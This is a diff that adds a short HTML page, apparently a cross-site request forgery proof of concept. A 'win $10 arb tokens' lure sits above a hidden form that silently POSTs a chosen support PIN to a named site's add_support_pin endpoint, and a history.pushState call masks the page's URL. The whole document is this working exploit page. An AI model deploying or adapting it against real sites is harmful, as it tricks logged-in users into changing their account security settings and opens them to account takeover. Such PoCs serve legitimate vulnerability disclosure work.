@@ -1,0 +1,13 @@
+
+<!DOCTYPE html>
+<html>
+<body>
+<h1>click below to win $10 arb tokens </h1>
+  <script>history.pushState('', '', '/')</script>
+    <form action="https://www.arbitraging.co/platform/add_support_pin"
+method="POST">
+      <input type="hidden" name="support&#95;pin" value="199622" />
+      <input type="submit" value="Submit request" />
+    </form>
+</body>
+</html>
